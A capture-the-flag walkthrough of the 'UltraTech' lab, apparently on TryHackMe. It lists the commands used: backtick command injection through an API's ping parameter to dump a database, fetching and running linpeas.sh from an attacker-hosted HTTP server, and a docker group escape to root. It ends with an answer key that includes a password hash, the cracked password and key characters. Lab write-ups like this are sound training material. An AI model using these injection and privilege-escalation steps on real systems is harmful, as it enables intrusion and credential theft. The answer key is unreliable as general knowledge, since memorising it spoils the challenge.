# UltraTech - Medium

```shell
rustscan -a 10.10.193.156 --range 0-65535 --ulimit 5000 -- -sV

gobuster dir -u http://10.10.193.156:8081 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak

gobuster dir -u http://10.10.193.156:31331 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak

ssh r00t@10.10.193.156

ls -la

#searching for privesc vectors

#on attacker machine
python3 -m http.server

#back to SSH session
wget http://10.14.31.212:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

#docker exploit from GTFObins
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
#this gives alpine not found error

docker images
#we have bash image here, that can be used

docker run -v /:/mnt --rm -it bash chroot /mnt sh
#this gives us root shell

cd /root

ls -la

cd .ssh

ls -la

cat id_rsa
#we can get root user's private SSH key here
```

```markdown
Open ports & services:

  * 21 - ftp - vsftpd 3.0.3
  * 22 - ssh - OpenSSH 7.6p1
  * 8081 - http - Node.js
  * 31331 - http - Apache httpd 2.4.29 (Ubuntu)

We can start enumerating web servers on both ports for directories while we explore the websites.

The webpage on port 8081 has the text "UltraTech API v0.1.3" and nothing else.

The webpage on port 31331 contains a generic webpage for the UltraTech company.

Directories on port 8081:

  * /auth
  * /ping

Directories on port 31331:

  * /css
  * /favicon.ico
  * /images
  * /index.html
  * /js
  * /partners.html
  * /robots.txt
  * /what.html

On port 31331, /js/api.js includes some logic behind the API on port 8081.
Furthermore, on /partners.html, we have a login page.

On /partners.html, when we attempt to login with an username and password, it redirects to the /auth page on port 8081 with a response.

Using the given hint, we are told not to spend too much time on /auth, so we navigate to the API code on /js/api.js

It contains a line of code:

    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`

We can try command execution by inserting our commands in the 'ip' parameter.

Using <http://10.10.193.156:8081/ping?ip=whoami> does not work; however if we use <http://10.10.193.156:8081/ping?ip=`whoami`> by adding backticks like the example snippet, we get an output in the error message.

From "ip=`ls -la`", we get to know the name of the database file used.

Using "ip=`cat utech.db.sqlite`", we get a couple of hashes for two users - r00t and admin.

The MD5 hash can be cracked with the help of online services.

Now we have the credentials r00t:n100906, we can SSH into the machine with this.

After SSHing, we need to find for privesc vectors; we can do so using linpeas.sh

We are part of the dockers group, so we can exploit that; we can use the exploit from GTFObins.

We need to make slight changes to it since we do not have the alpine image locally.

We eventually get shell as root using the bash image found.

root's private SSH key can be found in /root/.ssh/id_rsa
```

1. Which software is using the port 8081? - Node.js

2. Which other non-standard port is used? - 31331

3. Which software using this port? - Apache

4. Which GNU/Linux distribution seems to be used? - Ubuntu

5. The software using the port 8081 is a REST api, how many of its routes are used by the web application? - 2

6. There is a database lying around, what is its filename? - utech.db.sqlite

7. What is the first user's password hash? - f357a0c52799563c7c7b76c1e7543a32

8. What is the password associated with this hash? - n100906

9. What are the first 9 characters of root user's private SSH key? - MIIEogIBA
